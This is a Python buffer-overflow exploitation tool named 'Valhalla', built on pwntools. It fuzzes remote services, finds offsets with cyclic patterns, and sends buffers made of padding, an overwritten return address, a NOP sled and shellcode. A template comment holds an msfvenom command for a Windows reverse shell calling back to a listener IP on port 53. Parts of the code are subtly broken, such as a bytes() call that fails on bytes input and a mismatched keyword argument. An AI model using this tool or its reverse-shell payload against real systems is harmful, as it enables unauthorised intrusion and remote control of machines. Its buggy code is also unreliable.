#!/usr/bin/python
import random
import argparse
import os,sys,string,time
import ast

import pwn

#############################################################################################
#                                                                                           #
#   cookieCutterExploit                                                                     #
#   Cookie-cutter function to exploit the application                                       #
#                                                                                           #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def cookieCutterExploit(io = None):
    print('[+] Cookie Cutter Exploit mode', file=sys.stderr)

    # Write your code here

    buffer = []

    prefix = b""
    offset = 0
    overflow = b"A" * offset
    retn = b"BBBB"
    padding = b"\x90" * 16
    payload = b"" # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
    postfix = b""

    bufferEntry = prefix + overflow + retn + padding + payload + postfix
    buffer.append(bytes(bufferEntry, encoding='utf-8'))
    send(buffer, io)

#############################################################################################
#                                                                                           #
#   exploit                                                                                 #
#   Exploit the application with the given parameters from CLI                              #
#                                                                                           #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def exploit(offset, ret, nop, payload, before = None, io = None):
    print('[+] Exploit mode', file=sys.stderr)

    buffer = []
    bufferEntry = (b"A" * int(offset)) + ret + (b"\x90" * int(nop)) + payload
    buffer.append(bufferEntry)
    send(buffer, io)

#############################################################################################
#                                                                                           #
#   jsonExploit                                                                             #
#   Exploit the application with the given parameters from JSON file                        #
#                                                                                           #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def jsonExploit(path, io = None):
    print('[+] Json Exploit mode', file=sys.stderr)

    buffer = []
    bufferEntry = ""

    buffer.append(bytes(bufferEntry, encoding='utf-8'))
    send(buffer, io)


#############################################################################################
#                                                                                           #
#   fuzz                                                                                    #
#   Creates a buffer of increasing length strings and send it.                              #
#   Each string entry can be prepended by the 'before' argument, and contains               #
#   the given 'character' repeated, or a random one if 'randomCharacter' is set.            #
#                                                                                           #
#   bufferEntriesNumber : total number of strings in the buffer                             #
#   growingFactor (=100): string lenght is increased by this number each time,              #
#                         before being added to the buffer                                  #
#   character (='A'): the character to fill strings with                                    #
#   randomCharacter (=False): if set to True, a random character is chosen each time        #
#   before : if set, will be prepended to each buffer buffer entry                          #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def fuzz(bufferEntriesNumber, growingFactor = 100, character = "A", randomCharacter = False, before = None, io = None):
    print('[+] Fuzz mode', file=sys.stderr)

    buffer = []
    counter = growingFactor

    while len(buffer) < int(bufferEntriesNumber):
        bufferEntry = ''
        if (before):
            bufferEntry = before

        if (randomCharacter):
            rand = random.choice(string.ascii_letters)
            bufferEntry = bufferEntry + (rand * counter)
        else :
            bufferEntry = bufferEntry + (character * counter)

        buffer.append(bytes(bufferEntry, encoding='utf-8'))
        counter += growingFactor

    send(buffer, io)

#############################################################################################
#                                                                                           #
#   patternCreate                                                                           #
#   Sends a cyclic de Bruijn sequence pattern of the given size.                            #
#   This is similar to metasploit pattern_create.rb.                                        #
#                                                                                           #
#   size : size of the sequence                                                             #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def patternCreate(size, io = None):
    print('[+] Pattern Create mode', file=sys.stderr)
    buffer = []
    buffer.append(pwn.cyclic(int(size)))
    send(buffer, io)

#############################################################################################
#                                                                                           #
#   patternOffset                                                                           #
#   Finds the offset of the given hexadecimal value in the de Bruijn sequence pattern       #
#   This is similar to metasploit pattern_offset.rb.                                        #
#                                                                                           #
#   pattern : hexadecimal value to search in the sequence                                   #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def patternOffset(pattern, io = None):
    print('[+] Pattern Offset Search mode', file=sys.stderr)
    offset = pwn.cyclic_find(int(pattern, 16))
    print('[+] Offset = %s' % offset, file=sys.stderr)

#############################################################################################
#                                                                                           #
#   send                                                                                    #
#   Sends the given buffer entry by entry, with possibility to break each time              #
#                                                                                           #
#   buffer : buffer to send as output                                                       #
#   io (=None): pwn.tube object representing the connected remote                           #
#               application. If None, stdout is to be used as io.                           #
#                                                                                           #
#############################################################################################
def send(buffer, io = None):
    ask = True
    for bytesLine in buffer:
        try:
            if (ask):
                print('[+] %s bytes ready to send. Press anything to break after or \'c\' to not ask again' 
                    % len(bytesLine), file=sys.stderr)
                userInput = input()
                if (userInput.strip() == "c"):
                    ask = False 

            print('[+] Sending %s bytes...' % len(bytesLine), file=sys.stderr)
            if (io):
                io.send(bytesLine)
            else:
                fp = os.fdopen(sys.stdout.fileno(), 'wb')
                fp.write(bytesLine)
                fp.flush()

            print('[+] Done', file=sys.stderr)
        except Exception as e:
            print(e)
            print('[!] Unable to connect to the application. You may have crashed it.', file=sys.stderr)
            sys.exit(0)
            
            
#############################################################################################
#                                                                                           #
#   getBadChars                                                                             #
#   Randomly displays a beautiful viking banner                                             #
#                                                                                           #
#############################################################################################
def getBadChars():
    # Generated with :
    # for x in range(1, 256):
    #     print("\\x" + "{:02x}".format(x), end='')
    return b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\
    \x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\
    \x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\
    \x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\
    \x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\
    \x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\
    \x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\
    \xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\
    \xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\
    \xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\
    \xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#############################################################################################
#                                                                                           #
#   banner                                                                                  #
#   Randomly displays a beautifull viking banner                                            #
#                                                                                           #
#############################################################################################
def banner():
    print("\
              .__  .__           .__  .__          \n\
___  _______  |  | |  |__ _____  |  | |  | _____   \n\
\  \/ /\__  \ |  | |  |  \\__  \ |  | |  | \__  \  \n\
 \   /  / __ \|  |_|   Y  \/ __ \|  |_|  |__/ __ \_\n\
  \_/  (____  /____/___|  (____  /____/____(____  /\n\
            \/          \/     \/               \/ \n\
    ", file=sys.stderr)
    randomValue = random.randint(0, 2)
    if (randomValue == 0):
        print("\
    ,   |\ ,__\n\
    |\   \/   `.\n\
    \ `-.:.     `\n\
     `-.__ `\=====|\n\
        /=`'/   ^_\n\
      .'   /\   .=)\n\
   .-'  .'|  '-(/_|\n\
 .'  __(  \  .'`\n\
/_.'`  `.  |`\n\
          \ |\n\
          |/\n\
        ", file=sys.stderr)
    elif (randomValue == 1):
        print("\
     _.-._\n\
   .' | | `.\n\
  /   | |   \n\
 |    | |    |\n\
 |____|_|____|\n\
 |____(_)____|\n\
 /|(o)| |(o)|\\\n\
//|   | |   |\\\\\n\
'/|  (|_|)  |\`\n\
 //.///|\\\\\\.\\\\\n\
 /////---\\\\\\\\\\ \n\
 ////|||||\\\\\\\\\n\
 '//|||||||\\\\`\n\
   '|||||||`\n\
        ", file=sys.stderr)
    elif (randomValue == 2):
        print("\
                                   ||`-.___\n\
                                   ||    _.>\n\
                                   ||_.-'\n\
               ==========================================\n\
                `.:::::::.       `:::::::.       `:::::::.\n\
                  \:::::::.        :::::::.        :::::::\\\n\
                   L:::::::         :::::::         :::::::L\n\
                   J::::::::        ::::::::        :::::::J\n\
                    F:::::::        ::::::::        ::::::::L\n\
                    |:::::::        ::::::::        ::::::::|\n\
                    |:::::::        ::::::::        ::::::::|     .---.\n\
   .'_ \\            |:::::::        ::::::::        ::::::::|     \\ `--'\n\
   (( ) |           |:::::::        ::::::::        ::::::::|      \\ `.\n\
    `/ /            |:::::::        ::::::::        ::::::::|       L  \\\n\
    / /             |:::::::        ::::::::        ::::::::|       |   \\\n\
   J J              |:::::::        ::::::::        ::::::::|       |    L\n\
   | |              |:::::::        ::::::::        ::::::::|       |    |\n\
   | |              |:::::::        ::::::::        ::::::::|       F    |\n\
   | J\             F:::::::        ::::::::        ::::::::F      /     |\n\
   |  L\           J::::::::       .::::::::       .:::::::J      /      F\n\
   J  J `.     .   F:::::::        ::::::::        ::::::::F    .'      J\n\
    L  \  `.  //  /:::::::'      .::::::::'      .::::::::/   .'        F\n\
    J   `.  `//_..---.   .---.   .---.   .---.   .---.   <---<         J\n\
     L    `-//_=/  _  \=/  _  \=/  _  \=/  _  \=/  _  \=/  _  \       /\n\
     J     /|  |  (_)  |  (_)  |  (_)  |  (_)  |  (_)  |  (_)  |     /\n\
      \   / |   \     //\     //\     //\     //\     //\     /    .'\n\
       \ / /     `---//  `---//  `---//  `---//  `---//  `---'   .'\n\
________/_/_________//______//______//______//______//_________.'_________\n\
##########################################################################\n\
        ", file=sys.stderr)


if __name__ == "__main__":
    text = 'Valhalla is a binary exploitation tool allowing to make basic buffer overflow faster and easier.'
    parser = argparse.ArgumentParser(description=text)

    # General options
    parser.add_argument("-V", "--version", help="show valhalla version", action="store_true")
    parser.add_argument("-S", "--silent", help="hide beautiful viking banner (SHAME, you'll go to helheim !)", action="store_true")
    parser.add_argument("-b", "--before", help="When sending data (fuzz or exploit), this string is prepend first before each entry of the buffer")

    # Socket communication options
    parser.add_argument("-H", "--host", help="Set the host address where application is hosted")
    parser.add_argument("-P", "--port", help="Set the port where application is listening")

    # Fuzz options
    parser.add_argument("-f", "--fuzz", help="Fuzz the output")
    parser.add_argument("-g", "--grow", help="When fuzzing, the lenght is increased by this number each time (100 by default)")
    parser.add_argument("-c", "--char", help="When fuzzing, the buffer is filled with this character ('A' by default)")
    parser.add_argument("-R", "--random", help="When fuzzing, the buffer is filled random character instead", action="store_true")

    # Pattern options
    parser.add_argument("--pattern_create", help="Send a cyclic de Bruijn sequence pattern of the given size (similar to metasploit pattern_create.rb)")
    parser.add_argument("--pattern_offset", help="Search the offset of the given hexadecimal value in the de Bruijn sequence pattern (similar to metasploit pattern_offset.rb)")

    # Exploit options
    parser.add_argument("-e", "--exploit", help="Exploit the application", action="store_true")
    parser.add_argument("-o", "--offset", help="Offset (obtained with pattern/search) to fill before overflow")
    parser.add_argument("-r", "--ret", help="Return address, eg : override of EIP when overflow occurs. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
    parser.add_argument("-n", "--nop", help="Nop sled size, just before the payload")
    parser.add_argument("-p", "--payload", help="Payload bytes, to put after the Nop sled. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
    parser.add_argument("-k", "--cookie", help="Call the cookie-cutter exploit function, written by user", action="store_true")
    parser.add_argument("-j", "--json", help="Load the exploit parameters from the fiven json file")
    
    args = parser.parse_args()

    if not (args.silent):
        banner()
    if (args.version):
        print ("Valhalla version 999.0.0")
    else:
        io = None
        if (args.host and args.port):
            print('[+] Output set to %s:%s' % (args.host, args.port), file=sys.stderr)
            io = pwn.remote(args.host,args.port, timeout=2)
        else:
            print('[+] Output set to stdout', file=sys.stderr)

        if (args.fuzz):
            grow = args.grow
            if not (grow):
                grow = 100
            char = args.char
            if not (char):
                char = "A"
            fuzz(bufferEntriesNumber=args.fuzz, growingFactor=int(grow), character=char, randomCharacter=args.random, before=args.before, io=io)
        elif (args.pattern_create):
            patternCreate(size=args.pattern_create, io=io)
        elif (args.pattern_offset):
            patternOffset(offset=args.pattern_offset, io=io)
        elif (args.exploit):
            if (args.offset and args.ret and args.nop and args.payload):
                retBytes = ast.literal_eval(args.ret)
                payloadBytes = ast.literal_eval(args.payload)
                exploit(offset=args.offset, ret=retBytes, nop=args.nop, payload=payloadBytes, before=args.before, io=io)
            else:
                print('[-] Exploit mode needs offset (-o), return address (-r), nop sled size (-n), and payload (-p)', file=sys.stderr)
        elif (args.cookie):
            cookieCutterExploit(io=io)
        elif (args.json):
            jsonExploit(path=args.json, io=io)

        if (io):
            io.close()

